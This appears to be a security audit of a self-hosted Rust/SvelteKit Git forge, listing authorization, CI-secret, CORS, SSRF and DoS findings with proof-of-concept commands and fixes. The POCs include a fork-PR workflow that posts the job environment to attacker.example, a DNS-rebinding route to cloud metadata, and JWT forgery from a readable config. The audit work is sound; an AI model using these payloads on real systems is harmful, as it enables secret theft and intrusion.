# ForgeKeep — Deep Code Review & Security Audit

**Scope:** entire repository — 10 Rust crates (`crates/*`, ~4.3 MB, 512 source files), SvelteKit frontend (`web/`, 190 TS/Svelte files), deploy configs, scripts, docs.
**Method:** full-repo static analysis: deterministic pattern sweeps (AST-free greps, cfg(test)-stripped counts) + ~40 deep module audits (auth, git smart-HTTP, SSH, OCI/packages registries, repo service, PR/merge-queue, CI engine, runner, DB layer, CLI config, MCP, web frontend). Every non-trivial finding below was **verified against source line numbers**; verified-negative results are listed too so you know what was checked and found clean.

> Legend: **CRITICAL** = exploitable privilege/authz bypass or secret exposure. **HIGH** = exploitable with preconditions, or serious data-integrity risk. **MEDIUM** = defense-in-depth gap, DoS, or functional/data-integrity bug. **LOW/INFO** = rule violation, hygiene, residual risk.

---

## 1. Executive summary

ForgeKeep is a self-hosted Git forge (repos, PRs, issues, packages, OCI registry, LFS, CI, webhooks, MCP) in a single Rust workspace (axum 0.8 + SeaORM + gix + russh) with a SvelteKit SPA.

**The codebase is in much better shape than typical for this size** — the team has clearly done security passes before (in-code comments reference remediations `M-3`, `M-4`; JWT secrets are validated against a known-bad list; webhooks are HMAC-signed and secrets stored AES-256-GCM encrypted; redirects disabled on outbound clients; a double-pass DOM sanitizer; runner TLS verification; DB ops wrapped in transactions). However, the review found **one critical authz bypass, two high-severity secret/authorization issues, and a series of medium data-integrity and DoS gaps**, plus systematic violations of the project's own strict Rust/TS coding rules.

### Top findings at a glance

| # | Severity | Area | Finding |
|---|----------|------|---------|
| F-1 | **CRITICAL** | Repo contents API | Branch protection completely bypassed by the web-editor/contents write path |
| F-2 | **HIGH** | CI engine | Fork-PR workflows run with base-repo **decrypted secrets** (no fork gating) |
| F-3 | **HIGH** | HTTP/CORS | Default CORS reflects **any** origin with `Allow-Credentials: true` |
| F-4 | **HIGH** | CI runner | Runner tokens are **instance-wide** — one token reaches every repo's jobs & secrets |
| F-5 | **HIGH** | Webhooks/SSRF | DNS-rebinding TOCTOU: SSRF guard resolves DNS, then `reqwest` resolves again |
| F-6 | MEDIUM | rg-core | `merge_pr()` itself has **no ACL / branch-protection check** (HTTP layer is the only PEP) |
| F-7 | MEDIUM | Repo contents API | Unvalidated `branch` (revspec chars reach git argv), no ref CAS → lost-update race, no content size cap |
| F-8 | MEDIUM | Git protocol | Client-supplied refnames (`..`, leading `-`) reach `gix repo.reference()` unvalidated |
| F-9 | MEDIUM | LFS | No upload size cap, no server-side digest verification; unvalidated `oid` path join + panic gadget |
| F-10 | MEDIUM | Webhooks | `http://` webhook URLs allowed → HMAC secret + payload in cleartext |
| F-11 | MEDIUM | DoS | Unbounded pack ingest (SSH path); 1 GiB in-RAM body buffer (HTTP); unbounded `wants`/`haves` |
| F-12 | MEDIUM | Merge queue | Failed merge permanently strands the PR (`UNIQUE(pr_id)`, no auto re-queue) |
| F-13 | MEDIUM | DB / CI state | `resume_pipeline_chain` performs two updates **not** in one transaction → torn CI state |
| F-14 | MEDIUM | Config | TOML config file (contains `jwt_secret`) is not checked for `0600` permissions |
| F-15 … | LOW/INFO | various | see §5 |

---

## 2. What was verified as **sound** (so you don't re-audit it)

These areas were audited and **no exploitable issue was found**:

- **Auth primitives** — PATs stored as SHA-256 digests with expiry + owner-usability checks (`pat_auth.rs:30-48`); Argon2 password hashing; JWT `Validation::default()` (HS256+exp via jsonwebtoken defaults); 5-strike login lockout helper; `session_version`-bound cookie revocation (`api/auth.rs:~357`).
- **Session cookie flags** — `HttpOnly; SameSite=Strict; Secure(if HTTPS)` (`api/sso.rs:66-73`). *This is what currently downgrades F-3 from trivially exploitable to hardening-critical.*
- **Route authorization table** — all 23 `/admin/*` routes declare `InstanceAdmin`; no GET-mutators; org/team gating internally consistent; `route_table.rs` makes an `Access` label mandatory at registration (~320 gated routes counted).
- **Git smart-HTTP** — `check_git_access` runs **before** body buffering (verified call order `git_http.rs:458→614, 660→822, 864`); read/write split via `can_read`/`can_write`; no `info/refs` leak pre-auth; no shell anywhere — all git spawns go through `rg-git/src/cli_gateway.rs` with a **tree-wide regression test** forbidding `Command::new("git")` elsewhere.
- **OCI digest handling** — `digest_parts` (`rg-core/package_registry/oci/storage.rs:976-988`) strictly enforces `sha256:<64 hex>`; `verify_digest` exists; blob paths therefore cannot traverse. (One stale doc comment says `require_blob_digest`, which no longer exists — cosmetic.)
- **Package registry HTTP layer** — all 46 handlers carry authz extractors (`CiRead<Packages>` / `RepoWrite`); upload staging has a spool cap (413) and temp-file cleanup; no panic on malformed multipart.
- **Webhook integrity** — HMAC-SHA256 `X-Hub-Signature-256`; secrets AES-256-GCM at rest; never echoed back on list/get; userinfo credentials rejected; redirects **disabled** on the outbound client (`net.rs:82`).
- **Import/mirror** — `trusted_origins.guard_url` + `net::check_git_url_static` (private/metadata IP blocklists incl. `169.254.169.254`, CGNAT, ULA); mirror passwords encrypted; import PAT never persisted; import uses staging without clobbering existing history.
- **Repo lifecycle** — delete/transfer invalidate the permission cache (`repo/service.rs:2208, 2743`); transfer has a lease + collision check + staged rollback; the old "raw `DELETE FROM users` cascades repos but orphans storage bytes" footgun is documented and fixed with an explicit refusal of org-owned repos.
- **User deletion** — tokens/SSH keys cascade at the FK level (`migrations/m20260424_000003_create_keys_tokens.rs:51,107`); sessions die via `session_version`.
- **DB layer** — user retirement, admin updates, repo soft-delete, transfer, pipeline cancel are wrapped in `retry_transaction`/`begin`/`commit`; SQLite/Postgres migration locking with advisory locks; lock poisoning is *absorbed*, not panicked on (`rg-db/src/lib.rs:291,299`).
- **MCP server** — stdio-only, single PAT, thin REST proxy; **cannot exceed the PAT's REST ACL** (no privileged backdoor).
- **Web frontend** — `tsconfig.json` has `"strict": true`; **zero** non-null `!` assertions (precise regex sweep); no `eval`; token moved out of `localStorage` into memory (`_base.svelte.ts:75-96`); no open redirects (all `window.location` targets are hardcoded internal paths); search highlighting escapes HTML **before** inserting `<mark>` (`web/src/lib/utils/search.ts`).
- **Markdown sanitizer** (`web/src/lib/utils/markdown.ts`) — tag/attr allowlist, `on*` blocked, URL protocol allowlist (`http/https/mailto` + relative), `rel="nofollow noopener noreferrer"` forced, **multi-pass** convergence check with fail-closed after 4 passes (anti-mXSS), documented past `javascript&#58;` bypass fixed by requiring a real DOM.

---

## 3. Security findings (with POCs)

### F-1 · CRITICAL — Branch protection is bypassed by the contents API (web editor)

**Files:** `crates/rg-core/src/repo/service.rs:3051-3197` (`create_or_update_file`), `:3391-3489` (`delete_file`); HTTP layer `crates/rg-http/src/api/repo_content.rs:~1447-1528`.

The protection engine is enforced **only** inside the git-protocol wrappers:
- HTTP receive-pack: `receive_pack_rejected_refs` (`git_http.rs:246`) → `push_rules::branch_protection_rejected_refs`
- SSH receive-pack: `load_receive_pack_context` + same push rules (`rg-ssh/src/lib.rs:~1027`)

But the REST file-write endpoints don't go through either gate. The service functions commit in a temp worktree and push over a **filesystem URL**:

```rust
// repo/service.rs:3170-3184 (create_or_update_file; identical pattern in delete_file:3466-3474)
let output = gateway
    .run(&["push", &push_url, "--", branch], Some(&tmp))
    .context("git push failed")?;
```

`path_to_git_url(&repo_path)` builds a `file://…` URL — this push never crosses `receive_pack_http_with_rejections` or the SSH arm, so `require_pr`, `require_status_check`, `allow_force_push` and the direct-push allow-list **do not apply**. A file-wide grep confirms the service never consults protection: `protected`/`branch_protection` = **0 hits** in `repo/service.rs`. The HTTP handler only requires the `RepoWrite` extractor.

**Impact:** any collaborator with write access (or the web UI "edit file" button) can commit directly to a `require_pr` protected branch — no PR, no reviews, no status checks. This defeats the entire protection model and enables planting code that later merges/CI will trust. It is also a **data-loss vector**: protection is the control that stops unreviewed force-style changes to release branches.

**POC:**
```bash
# as RepoAdmin: protect main (require PR)
curl -X POST https://forge/api/v1/repos/acme/app/branch-protections \
  -H "Authorization: Bearer $ADMIN_PAT" \
  -d '{"branch":"main","require_pr":true,"required_approvals":2}'

# as a plain RepoWrite collaborator (no PR, no approvals):
curl -X PUT "https://forge/api/v1/repos/acme/app/contents/README.md" \
  -H "Authorization: Bearer $RW_PAT" \
  -d '{"branch":"main","content":"# pwned","message":"direct commit"}'
# → 201; commit lands on protected main with zero approvals
# (the same commit pushed via `git push` is correctly rejected)
```

**Fix:** call `branch_protection::service::check_push_allowed(...)` (or a dedicated API variant) inside `create_or_update_file`/`delete_file` before committing, or route the temp-worktree push through the same `push_rules` gate the protocols use.

---

### F-2 · HIGH — Fork-PR workflows run with the base repository's decrypted secrets

**Files:** `crates/rg-ci/src/runner.rs` (`job_environment`, secrets injected at `~:1104` via `mask_values(&log, &secret_values)` after the job), `crates/rg-ci/src/gitea_actions.rs:316` (`pull_request_target` parsed as a plain trigger name).

`job_environment` unconditionally loads **`list_by_repo(self.repo_id)`** — the repo the pipeline belongs to — and injects those secrets **decrypted** into the job environment. Grep for `from_fork|is_fork|forked|head_repo|allow_secrets` across `rg-ci` production code: **0 hits**. There is no GitHub-style policy ("fork PR ⇒ no secrets / read-only token") and no distinction between `pull_request` and `pull_request_target` beyond trigger parsing.

**Impact:** a fork author can open a PR whose workflow runs in the **base** repo's pipeline context and reads its secrets. This is the classic `pull_request_target` footgun, made worse because ForgeKeep implements *no* opt-in guard at all.

**POC:**
```yaml
# in fork: .forgekeep/workflows/steal.yml  (open PR fork → upstream)
on: pull_request
jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s -X POST --data "$(env)" https://attacker.example/collect
# If the upstream defines DEPLOY_KEY / AWS_SECRET etc. as repo secrets,
# job_environment injects them into `env` → attacker collects them.
```
**Fix:** when the PR head repo id ≠ base repo id, either refuse secret injection (empty `secrets` context), or run fork pipelines with an unprivileged token model, and require explicit opt-in for `pull_request_target`-style secrets.

---

### F-3 · HIGH (hardening) — Default CORS reflects any origin with credentials

**File:** `crates/rg-http/src/routes.rs:243-250` (fallback branch of `build_cors_layer`)

```rust
_ => {
    tracing::warn!("FORGEKEEP_CORS_ORIGINS not set — CORS allows all origins …");
    CorsLayer::new()
        .allow_origin(tower_http::cors::AllowOrigin::mirror_request())
        .allow_methods(methods)
        .allow_headers(headers_list)
        .allow_credentials(true)     // ← reflects ANY Origin + credentials
        .max_age(Duration::from_secs(3600))
}
```

**Verified natively.** When `FORGEKEEP_CORS_ORIGINS` is unset (the default), every request's `Origin` is mirrored **and** `Access-Control-Allow-Credentials: true` is returned. Per the CSRF middleware (`middleware.rs:155-159`), GET/HEAD are considered safe — so CSRF does not stop cross-origin **reads**.

**Current mitigation:** the auth cookie is `SameSite=Strict` (`api/sso.rs:67-73`), and modern browsers do not attach Strict cookies to cross-site `fetch(..., {credentials:'include'})` — so today the reflected ACAO cannot steal cookie-authenticated data. **Why it's still HIGH:** (a) it is a one-config-flip catastrophe — any operator who deploys the SPA on a separate origin (the usual reason to touch CORS at all) will reach for `SameSite=None`, instantly making this a full account-data-theft primitive; (b) `mirror_request + credentials` is exactly the misconfiguration security scanners flag; (c) token-bearing `Authorization` clients don't need CORS at all, so the permissive default buys nothing.

**POC:**
```bash
curl -si https://forge.example/api/v1/user -H "Origin: https://evil.example" \
  | grep -i access-control
# access-control-allow-origin: https://evil.example
# access-control-allow-credentials: true
```
**Fix:** when unset, default to **no CORS at all** (same-origin SPA needs none). Mirror-with-credentials should be impossible by construction: only a non-empty allow-list may combine with `allow_credentials(true)`.

---

### F-4 · HIGH — Runner tokens are instance-wide and unlock every repo's CI secrets

**Files:** `crates/rg-http/src/api/runners.rs:143-1865` (`register` gated `InstanceAdmin`; `authenticate_runner` accepts `runner.id == path id`), `crates/rg-db/src/entities/runner.rs` (no `repo_id`/`org_id` column), `crates/rg-ci/src/runner.rs:~656` (claimed job receives **decrypted** repo secrets).

A runner has only `labels`; `poll_job` claims any matching pending job **instance-wide** with no repo scoping. The server hands the claimed job's repository secrets to the runner.

**Impact:** one leaked runner token (config file on a shared CI box, accidental commit, log leak) exposes the secrets of **every repository on the instance** whose jobs match the runner's labels.

**POC:** steal `runner.token` from any runner config → `POST /api/v1/runners/{id}/poll` with `Authorization: Bearer <stolen>` → claim a job of an unrelated high-value repo → read its secrets from the job payload.

**Fix:** scope runners to repos/orgs (persist ownership on the runner row and filter `poll_job` by it), or at minimum offer scoped runner classes; rotate-on-use options for high-privilege runners.

---

### F-5 · HIGH — SSRF guard has a DNS-rebinding TOCTOU (webhooks + git fetch paths)

**File:** `crates/rg-core/src/net.rs:51-83, 148-219`; `crates/rg-core/src/webhook/service.rs:~349`.

The guard is genuinely good on paper: static URL checks at create/update, then `guard_outbound_url` resolves DNS and rejects RFC1918/loopback/link-local/metadata/CGNAT/ULA — **fail-closed** if the host doesn't resolve. But:

```rust
// net.rs:51 outbound_client_builder(): timeout + connect_timeout + redirects OFF,
// NO custom connector / no pinned SocketAddr
```

`guard_outbound_url(url)` does **its own** DNS resolution and classification; afterwards the shared `reqwest` client performs a **second, independent** resolution when it connects. An attacker-controlled authoritative DNS server can answer the guard with a public IP and the connect with `169.254.169.254` / `10.0.0.5` (rebinding). Redirects cannot complete the bypass (policy `none`), but the **first hop** can.

**Impact:** signed webhook payloads (and any outbound fetch using this client) can be directed at cloud metadata or internal services → credential theft / internal SSRF on self-hosted deployments.

**POC:** register webhook to `https://rbnd.attacker.example/hook`; DNS TTL=0; first answer `1.2.3.4` (public, passes guard), second answer `169.254.169.254` (used by reqwest connect). Webhook POST (with HMAC secret and payload) arrives at the metadata service.
**Fix:** resolve once in the guard and pass the pinned `SocketAddr`/`reqwest::dns::Resolve` implementation to the client, or re-validate the connected peer IP at the connector layer.

---

### F-6 · MEDIUM — `merge_pr()` in rg-core performs **no** authorization or protection checks

**File:** `crates/rg-core/src/pull_request/service.rs:1569-1634`.

`merge_pr(db, repo_root, owner, repo_name, number, strategy, …)` takes **no actor id**; within the function there are zero matches for `approv|review|actor|protected|can_merge`. It checks only `state == open` and `!is_draft`, claims the merge, and merges. Branch protection *is* enforced — but only at the single HTTP call site (`crates/rg-http/src/api/pulls.rs:426-450`, which correctly runs `check_merge_allowed` and documents why the lookup must not be swallowed).

**Why MEDIUM, not CRITICAL:** the verified REST caller enforces `RepoWrite` + `check_merge_allowed`. But rg-core is a library: **every future caller** (CLI subcommand, MCP tool, auto-merge scheduler, tests) silently gets an unprotected merge. Note `try_auto_merge` (1393) funnels into the same unprotected core.

**POC (library misuse):** a new internal endpoint calling `rg_core::pull_request::merge_pr(...)` directly merges any open non-draft PR with zero approvals — the core never objects.
**Fix:** thread an `actor_id` through `merge_pr` and run `check_merge_allowed` inside the core, keeping the HTTP check as a fast-fail.

---

### F-7 · MEDIUM — Contents-API writes: unvalidated `branch`, no ref CAS (lost updates), no size cap

**File:** `crates/rg-core/src/repo/service.rs:3051-3197` (create/update), `:3391-3489` (delete).

1. **Branch is never validated as a refname.** Only `validate_repo_file_path(file_path)` is applied. The raw `branch` string flows into `get_file_sha(repo, branch, path)`, `checkout -b <branch>` and `push URL -- <branch>`. The `--` guard blocks *option* injection (`-c`, `--exec`), not *revspec* semantics: `main^`, `@{-1}`, `HEAD:refs/heads/x` are accepted by git's rev parser, producing wrong-ref reads/writes and lying hook payloads (the HTTP layer builds `old_sha` via `previous_branch_sha(&repo_path, &branch)` → `rev_parse_single` — a revspec, not a refname — `api/repo_content.rs:~1476,1711`).
2. **No compare-and-swap on the ref.** Concurrency control is a *file-blob* SHA check (`get_file_sha`, `:3076-3095`), then a plain non-forced `git push`. Two writers editing *different* files on the same branch both pass the blob check; the loser is rejected only by non-fast-forward luck inside the race window → **lost update / clobbered commit** (data loss). The optional `sha` in the update request is not a ref CAS.
3. **No content size cap.** `std::fs::write(&full_path, content)` (`:3144`) — `CreateOrUpdateFileRequest.content` is unbounded → authenticated disk-exhaustion (multi-GB base64 blobs).

**POC (race):** two parallel `PUT /contents/a.txt` and `PUT /contents/b.txt` with valid current SHAs on branch `main` — both return 201 in the race window; one commit silently disappears from the branch when the loser's push wins/loses non-deterministically.
**Fix:** `git check-ref-format --refspec-pattern`-equivalent validation (or gix refname validation) for `branch`; take a ref lock or CAS `old→new` in one `update-ref` transaction; cap decoded content (e.g. `MAX_BLOB_API_BYTES`).

---

### F-8 · MEDIUM — receive-pack client refnames reach `gix repo.reference()` unvalidated

**File:** `crates/rg-git/src/protocol/receive_pack.rs:277, 634-646`.

```rust
fn update_ref(repo_path: &Path, refname: &str, new_sha: &str) -> Result<()> {
    ...
    repo.reference(refname, object_id, PreviousValue::Any, "update via receive-pack")
```

The command parser takes `parts[2]` as the refname with **no** `git-check-ref-format` equivalent: `refs/heads/a..b`, `refs/heads/-x`, `foo/../bar` are not rejected in this layer. Protection patterns are checked (`validate_tag_protection_pattern:572` is for *admin* globs only). `gix` *may* reject illegal names at the refs layer (not verified in-repo), and there is no shell/argv interpolation — but a rules engine built on string-matching refnames (`refs/heads/main`) can be desynced by odd-but-accepted spellings.

**POC:** `git push origin HEAD:refs/heads/ma~in` on a repo whose protection rule names `main` — observe whether the rule misses the mutated refname (works whenever the storage layer accepts the name).
**Fix:** validate client refnames once at parse time (`gix::refs::name::check_refname` or `git check-ref-format` via the gateway) and reject before policy evaluation.

---

### F-9 · MEDIUM — LFS: no size cap, no server-side digest verification, unsafe legacy path join

**File:** `crates/rg-core/src/lfs/service.rs`.

- **No size limit:** production constants are only `ZSTD_LEVEL`, URL TTLs. Batch rejects `size < 0` only (`:390`) → authenticated disk-exhaustion by uploading multi-GB "LFS objects".
- **No digest verification:** the client-declared `oid` is trusted; nothing recomputes SHA-256 on upload or download → corrupted/mismatched objects are persisted and served (integrity + poisoned-cache risk for artifact consumers).
- **Legacy FS join without validation + panic gadget:**
  ```rust
  // :336-340
  fn lfs_object_path(lfs_root: &Path, oid: &str) -> PathBuf {
      let prefix = &oid[..2];               // panics if oid.len() < 2
      lfs_root.join(prefix).join(oid)       // no is_valid_oid() here
  }
  ```
  Today the HTTP boundary validates (`api/lfs.rs:437` `is_valid_oid(&oid)`), so traversal is currently **mitigated** — but this is one future caller away from `../` traversal, and `oid[..2]` is a remote panic if any path reaches it with a 1-byte oid.

**POC (size):** `PUT /repos/o/r/lfs/objects/<64hex>` with a 50 GB body streamed from `/dev/zero` → accepted until disk fills (no 413).
**Fix:** enforce max object size at batch+upload; verify `sha256(content) == oid` before finalize (as `verify_digest` already does for OCI); delete `lfs_object_path` or make it call `is_valid_oid`.

---

### F-10 · MEDIUM — `http://` allowed for webhook targets (HMAC secret in cleartext)

**File:** `crates/rg-core/src/net.rs:~165` — scheme allow-list is `http|https` on purpose ("not allowed (only http/https)"). Combined with F-5's cleartext first hop, webhook payloads **and the HMAC secret-bearing headers** travel unencrypted; an on-path actor can read payloads and replay/modify (they can't forge the HMAC, but delivery content leaks).

**POC:** `POST /repos/o/r/webhooks {"url":"http://attacker-sniffer.internal/hook"}` → accepted.
**Fix:** default-deny plain http (config opt-in), or warn-per-webhook in the UI/API response.

---

### F-11 · MEDIUM — Memory-DoS surfaces in the git transports

- **SSH receive-pack has no pack-size cap** (`rg-git/src/protocol/receive_pack.rs` native indexer `~:424` reads the whole pack via `.read_to_end(&mut pack)`; `receive_pack.rs` has no `receive.unpackLimit` equivalent). HTTP has a cap — but it is a **1 GiB in-RAM `Vec`** per concurrent authenticated request (`git_http.rs:72` `GIT_BODY_MAX_BYTES`); authz does run before buffering (verified), so this needs valid push/pull access — still 32 parallel pushes ≈ 32 GiB RSS.
- **`wants`/`haves` unbounded** in upload-pack v1/v2 (`upload_pack.rs:184`, `v2.rs:457-458` accumulate until flush; count unbounded) → millions of `want <sha>` lines allocate unboundedly and can become a huge argv/stdin to `pack-objects`.

**POC (SSH):** `git push` with a crafted 8 GB thin pack to an SSH remote → OOM before any unpack limit.
**Fix:** spool packs to disk with a byte cap at the protocol boundary; cap `wants` count and total command-frame bytes.

---

### F-12 · MEDIUM — Merge queue strands PRs after a failed merge

**Files:** `crates/rg-core/src/pull_request/merge_queue.rs`; `crates/rg-db/src/ops/merge_queue_ops.rs:207-241,366-372`.

`merge_queue_entries.pr_id` has a **lifetime** UNIQUE index (not "one queued row"). `finish(...)` writes a terminal status and inserts **no** replacement queued row. Consequence: after one failed attempt (e.g. transient CI failure), the terminal row keeps occupying `pr_id`, and re-enqueue is absorbed as a unique violation — the PR silently falls out of the queue with no automatic retry. (Positively: double-merge via two rows is impossible, and `claim` is a proper CAS on `queued→in-flight`.)

**POC:** enqueue PR #7 → CI flakes → merge fails → entry finishes `failed` → `POST /merge-queue/enqueue` again → API reports queued-but-existing/absorbed; PR #7 never merges until someone deletes the old row manually (if any API even exposes that).
**Fix:** make the unique index partial (`WHERE status IN ('queued','in-flight')`) or delete/replace the terminal row on re-enqueue.

---

### F-13 · MEDIUM — `resume_pipeline_chain` / `resume_approval_chain` are not transactional (torn CI state)

**File:** `crates/rg-db/src/ops/pipeline_ops.rs:368-396, 398-418`.

Both issue **separate** `.exec(db)` writes (stage status, then pipeline status) on the live connection — no `begin`/`retry_transaction`, unlike their cancel siblings (`cancel_pipeline_chain:1382` is wrapped).

**Impact:** crash/lock-failure between the two updates leaves a stage `pending` under a still-`cancelled` pipeline (or vice versa) — jobs scheduled against terminal pipelines; CI state machine corruption that operators must fix by hand.

**POC:** induce a failure (lock timeout) on the second update; inspect `pipelines` vs `pipeline_stages` — mismatched statuses persist.
**Fix:** wrap in the existing `retry_transaction("resume pipeline", …)` helper.

---

### F-14 · MEDIUM — Config file permissions are never checked (secrets world-readable possible)

**File:** `crates/rg-cli/src/config.rs:403,450-451` (`ensure_regular_file` checks existence/regular only — `0600` count in file: **0**).

`forgekeep.toml` carries `jwt_secret` (and optionally DB URL/runner tokens). The **at-rest encryption key file** *is* properly checked (`serve.rs:410-423` rejects mode `& 0o077 != 0`, writes `0o600` — good), but the TOML itself is not: on a shared host with a permissive umask, `jwt_secret` is world-readable → **full token forgery → admin takeover** (JWT = HS256 with that secret).

**POC:**
```bash
umask 000; forgekeep serve   # config created 0666
cat /path/forgekeep.toml     # any local user: jwt_secret = "…"
# → forge JWTs for any user id; full instance compromise
```
**Fix:** after load, `meta.permissions() & 0o077 != 0 → bail` (mirror the key-file check), and write configs `0600` when the CLI generates them.

---

### F-15 … LOW / INFO (verified, non-critical)

| ID | Where | What | Why it matters / fix |
|----|-------|------|----------------------|
| L-1 | `oci.rs:1101-1105` | `put_manifest` materializes the whole manifest as `String` before any cap check | memory-DoS residual; reject-by-length before allocating |
| L-2 | `oci.rs:979,1001` | pagination `expect("a non-empty page has a last tag")`, `HeaderValue::try_from(link).expect(...)` | input-shaped invariants → should be `Result` (also a rules violation) |
| L-3 | `api/packages.rs:2419` | `Content-Disposition` built via `format!` with stored filename, no RFC 5987 quoting | residual header-injection if a filename ever carries CR/LF/quotes (multipart parse path currently neutralizes it) |
| L-4 | `api/packages.rs:1058-1063` | upload filename not reduced to basename (storage path is safe; stored name can be `../../evil`) | misleading names in UI; sanitize to `file_name()` |
| L-5 | `user/service.rs:872-888` | `update_user_admin` has no in-service gate (HTTP gates it `InstanceAdmin` — route table verified) | library-level privilege escalation if reused; thread an admin actor check |
| L-6 | `config.rs:491` | default bind `0.0.0.0:8080`/`0.0.0.0:2222`, TLS optional (warn only) | document + `listen_on_all_interfaces` explicit opt-in |
| L-7 | `oci/storage.rs:127` | stale doc-comment references `require_blob_digest` (function no longer exists) | doc rot on a security boundary — fix the reference |
| L-8 | `ARCHITECTURE.md:122-136` | dependency graph omits `rg-http→rg-db/rg-mcp/rg-runner`, `rg-core→rg-git`, `*-→rg-process`; claims `rg-git` depends on none — it depends on `rg-process` | docs mislead auditors |
| L-9 | `lfs/service.rs:236,265` | `Hmac::new_from_slice(...).expect(...)` | infallible for HMAC but rules-forbidden; use `?` |
| L-10 | `rg-mcp` explore | empty-owner `list_repos` hits public `/repos/explore` not user-scoped listing | cosmetic scope surprise for PAT holders |

---

## 4. Rust coding-rule compliance (the project's own strict rules)

These are findings against the ruleset in the review request (zero-copy, zero-panic, no `dyn`, const/max-constness, clippy-pedantic-level hygiene). Counts are **production code only** (`/tests/` dirs, `*_tests.rs` files and `#[cfg(test)]` modules excluded — verified programmatically).

### R-1 · Panic-family calls: **71** in production code (rule: zero)

Per crate: rg-db 27, rg-core 20, rg-http 12, rg-process 7, rg-runner 3, rg-ci 1, rg-mcp 1.
Most are *static-invariant* expects (compiled-in `Regex::new("...").expect("valid regex")`, `write!` into `String`) — infallible at runtime, but still forbidden and they set the precedent that erodes under maintenance. The ones that can actually fire:

```rust
// rg-db/src/ops/repo_ops.rs:1128 — WORST: post-commit success-path
// panics AFTER the transfer transaction has committed → process aborts, hooks/state diverge
.expect("transferred repository row must be returned")

// rg-http/src/oci.rs:979-1001 — attacker-influenced pagination invariants
.expect("a non-empty page has a last tag")
HeaderValue::try_from(link).expect("percent-encoded OCI pagination link is a header")

// rg-core/src/runner.rs:54 (rg-ci)
() = &mut heartbeat_loop => unreachable!("job heartbeat loop is infinite")

// rg-db/src/entity_schema_guard.rs:158-160 — startup census IO
.expect("read entities dir")
```
**Fix direction:** `Result`-ify pagination/invariants; keep infallible expects behind a documented `Infallible` helper if desired — the ruleset allows no exceptions, so convert all 71.

### R-2 · `Vec::new()` / `HashMap::new()`: **342 + 52** sites (rule: `with_capacity` always)

Heaviest: rg-core 143+5, rg-http 46+7, rg-git 44+2, rg-ci 46+24. Many are in per-request paths (hot). Sample:
```rust
// crates/rg-http/src/git_http.rs:99 — per push/fetch request
let mut collected: Vec<u8> = Vec::new();   // final size = Content-Length when present
```
**Fix direction:** where a size hint exists (headers, prior lengths), use `with_capacity`; a clippy lint (`clippy::new_without_zero_cost`-style custom) can gate regressions.

### R-3 · `.clone()` / `.to_owned()`: **1 051 + 593** sites (rule: never duplicate memory)

Heaviest: rg-core 391, rg-http 259, rg-db 92+465 (`to_owned` dominated by SeaORM `ActiveValue::Set(x.to_owned())` — a framework pattern worth a macro/extension to centralize). Verified *not* hot-path: merge-queue clones are per-enqueue `ActiveModel` conversions, git protocol clones are small strings. Still: rules demand ownership moves or `Cow<'a, str>`; e.g. `push_hooks.rs` payload plumbing clones the same payload 3-4 times through the pipeline.

### R-4 · `dyn` trait objects: **74** sites (rule: static dispatch / generics only)

Dominant pattern is DI-by-trait-object, e.g.:
```rust
// crates/rg-http/src/lib.rs:114,134
pub blob_storage: Arc<dyn rg_core::blob_storage::BlobStorage>,
pub ci_engine:   Arc<dyn rg_core::ci::CiTrigger + Send + Sync>,
```
plus 59 in rg-core. This is *idiomatic* Rust for runtime-swappable storage backends, but it violates the stated no-`dyn` rule. Options: generic `AppState<B: BlobStorage>` monomorphization, or `enum` backend dispatch (`enum BlobStorage { Fs(Fs), S3(S3) }` with `match`) — the latter keeps a single concrete type and is compile-time dispatch.

### R-5 · `unsafe`: 20 sites — reviewed, mostly justified, one needs attention

- 5× `libc::geteuid/getegid` (root detection) — trivially sound.
- ~15× `crates/rg-process/src/lib.rs` Windows Job Objects / `Toolhelp32Snapshot` / raw handle casts (`OwnedHandle::from_raw_handle`). Handle-lifetime code is where soundness bugs hide (double-close, orphaned handles on error paths between `CreateJobObjectW` and `from_raw_handle`). Recommend a targeted `// SAFETY:` comment audit + Windows CI stress test. (Rule-wise: file-level `#![forbid(unsafe_code)]` is not in place anywhere.)

### R-6 · Blocking I/O in `async fn` (rule spirit: never block the executor)

`std::fs::*` called from async contexts: **78** sites in `repo/service.rs` alone (e.g. `:3144 std::fs::write` inside `pub async fn create_or_update_file`), 22 in `api/repo_content.rs`. Under load these stall tokio workers (the 1 GiB git buffer also blocks). Use `tokio::fs`/`spawn_blocking`.

### R-7 · Positive compliance notes

- No `static mut`; exhaustive `match` style throughout; `From`/`TryFrom` widely implemented; heavy use of `?`/`bail!` with a central error type; DRY holds at the function level (normalized-body duplicate scan found only 2 ≥400-char identical bodies — both migration scaffolding; the team even **deleted** a drifted duplicate push-gate, documented at `branch_protection/service.rs`).
- Startup-path `expect`s (client builders `net.rs:91`, `rg-mcp/lib.rs:76`, `runner/commands.rs:88`) are fail-fast boot errors — the least-bad class, though still rule-violating.

---

## 5. TypeScript/Svelte rule compliance

| Rule | Verdict |
|------|---------|
| `strict: true` | ✅ present in `web/tsconfig.json` |
| No `any` (use `unknown`) | ❌ ~261 hits, overwhelmingly `catch (e: any)` (e.g. `web/src/lib/stores/auth.svelte.ts:76,105,134,149`, `AttachmentPanel.svelte:30,44,57`). **Fix:** `catch (e: unknown)` + narrow (`e instanceof Error ? e.message : String(e)`). |
| No non-null `!` | ✅ **zero** true non-null assertions (precise sweep) |
| No crashes / Either-style | ✅ API layer returns typed envelopes; UI catches at call boundaries |
| Heavy tasks off main thread | ✅ N/A — no heavy client crypto/parsing found |
| `{@html}` discipline | ⚠️ 14 sites; audited: `highlightText` (escaped-first ✅), markdown preview (double-pass sanitizer ✅), MFA `qr_svg` (server-generated SVG ✅). **Recommendation:** funnel all 14 through one `sanitizeHtml()` choke point and add a lint rule banning raw `{@html}` outside it (the sanitizer's own comment warns against a second weaker implementation — enforce that in CI). |
| Pre-allocated collections / no `+=` string loops | ✅ no violations found in sampled hot paths |
| `readonly` DTOs | ⚠️ partial — API models in `web/src/lib/api/*.ts` are mostly plain `interface`s; consider `readonly` fields for value objects |
| ts-ignore/expect-error | ✅ only 2, both justified (`i18n/catalogCoverage.test.ts:7,9`) |
| ESLint strict-type-checked | ⚠️ config not inspected in this pass — verify `@typescript-eslint` strict-type-checked preset is enabled |

---

## 6. Extra/duplicate code observations

